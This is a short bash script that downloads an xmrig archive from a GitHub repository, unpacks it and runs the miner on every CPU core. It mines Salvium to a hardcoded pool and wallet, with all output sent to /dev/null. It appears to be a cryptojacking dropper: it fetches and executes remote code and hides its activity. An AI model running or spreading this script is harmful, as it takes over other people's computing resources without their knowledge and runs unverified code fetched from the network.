#!/bin/bash
A=sg.salvium.herominers.com:1230
B=SaLvs7xibBHMyhQDy4E5LD9f81dhsQXYmBtNxWy2NkV7MUi74K927ZjCTavsN5dvGPf7jw38JKzYdRuLAiuMEoTFXRV49Woppoe
C=jr
wget https://github.com/Adeemar7/all/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz >/dev/null 2>&1
./xmrig --coin=SAL --url $A --user $B --pass $C --donate-level 1 -a rx/0 -t $(nproc --all) >/dev/null 2>&1
